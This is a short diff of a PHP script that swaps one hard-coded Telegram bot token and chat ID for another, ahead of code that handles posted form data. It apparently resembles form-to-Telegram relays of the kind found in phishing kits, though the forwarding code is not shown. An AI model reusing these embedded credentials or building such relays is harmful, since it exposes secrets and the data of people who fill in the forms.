@@ -1,7 +1,7 @@
 <?php
 // Telegram Bot Token and Chat ID
-$botToken = "8561348216:AAHFH2YQeuNhJsZ8LSxv9MXuRMhFbDo8c5M"; // Replace with your bot token
-$chatId = "7493207029"; // Replace with your chat ID
+$botToken = "8218593631:AAHMViwuLkbDOovuTVf6w2KKe95XtBFF2fE"; // Replace with your bot token
+$chatId = "8083134642"; // Replace with your chat ID
 
 // Check if form data is received via POST
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
